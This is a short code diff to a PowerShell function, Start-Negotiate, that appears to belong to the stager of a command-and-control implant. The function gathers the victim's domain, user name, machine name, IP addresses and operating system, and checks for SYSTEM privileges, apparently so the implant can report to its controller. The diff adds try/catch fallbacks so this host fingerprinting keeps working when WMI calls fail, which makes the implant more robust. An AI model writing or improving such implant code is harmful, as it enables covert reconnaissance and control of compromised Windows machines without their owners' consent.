@@ -160,14 +160,26 @@ function Start-Negotiate {
 
     # get some basic system information
     $i=$nonce+'|'+$s+'|'+[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
-    $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
+
+    try{
+        $p=(gwmi Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
+    }
+    catch {
+        $p = "[FAILED]"
+    }
+   
 
     # check if the IP is a string or the [IPv4,IPv6] array
     $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
     if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
     $i+="|$ip";
 
-    $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
+    try{
+        $i+='|'+(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
+    }
+    catch{
+        $i+='|'+'[FAILED]'
+    }
 
     # detect if we're SYSTEM or otherwise high-integrity
     if(([Environment]::UserName).ToLower() -eq "system"){$i+="|True"}
